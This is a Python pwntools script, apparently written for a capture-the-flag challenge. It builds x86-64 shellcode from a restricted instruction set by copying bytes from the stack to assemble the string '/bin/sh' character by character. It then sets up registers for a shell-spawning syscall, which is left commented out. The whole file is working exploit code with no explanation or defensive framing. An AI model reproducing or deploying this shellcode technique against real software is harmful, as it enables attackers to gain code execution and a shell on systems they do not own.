from pwn import *
context.arch="amd64"
context.os="linux"
shc="""
    add ax,ax
    adc ax,bx
    sub ax,ax
    sbb ax,dx
"""

#print(disasm(asm(shc)))
#print(disasm(b'\xc7\xc0'))
#['0x2f', '0x33', '0x7', '0x5', '-0x3f', '0x44', '-0xb']

mov4=['movs dword ptr [rdi], dword ptr [rsi]']
mov1=['movs byte ptr [rdi], byte ptr [rsi]']
setmem=[
    'push rdi',
    'pop rax',
    'push rcx',
    'pop rdi',
    'stos byte ptr [rdi],al',
    'push rdi',
    'pop rcx',
    'push rsi',
    'pop rdi',
]
shc=[
    'pop rsi',
    'push rsp',
    'pop rdi',#rdi=??f0
    'push rsp',
    'pop rcx',
    'push rsp',
    'pop rsi',
    'push rsp',
    'pop rdx',#rsi=rdi=rcx=rdx
]+mov4*(4)+mov4*(0x2f//4)+mov1*(0x2f%4)+setmem+[
    #to /:0x2f
]+mov4*(0x33//4)+mov1*(0x33%4)+setmem+[
    #to b
]+mov4*(0x7//4)+mov1*(0x7%4)+setmem+[
    #to i
]+mov4*(0x5//4)+mov1*(0x5%4)+setmem+[
    #to n
    'std',
]+mov4*(0x3f//4)+mov1*(0x3f%4)+['cld']+setmem+[
    #to /
]+mov4*(0x44//4)+mov1*(0x44%4)+setmem+[
    #to s
    'std'
]+mov4*(0xb//4)+mov1*(0xb%4)+['cld']+setmem+[
    #to h
]+[
    'push rbx',
    'pop rax',
    'push rcx',
    'pop rdi',
    'stos byte ptr[rdi],al',
]+[
    'push rsi',
    'pop rdi',
    'std',
]+mov4*(0x2d//4)+mov1*(0x2d%4)+['cld']+[
    'push rdi',
    'pop rax',
    'stos byte ptr [rdi],al',
    'push rbx',
    'pop rax',
    'lods al,byte ptr [rsi]',
    'push rdx',
    'pop rdi',
    'push rbx',
    'push rsp',
    'pop rsi',
    'push rbx',
    'pop rdx',
    #'syscall'
]
shct='\n'.join(shc)
#print(shct)
shcb=asm(shct)
#open("shcraw","wb").write(shcb)
#print(disasm(asm(shct)))
#print(hex(len(shcb)+11))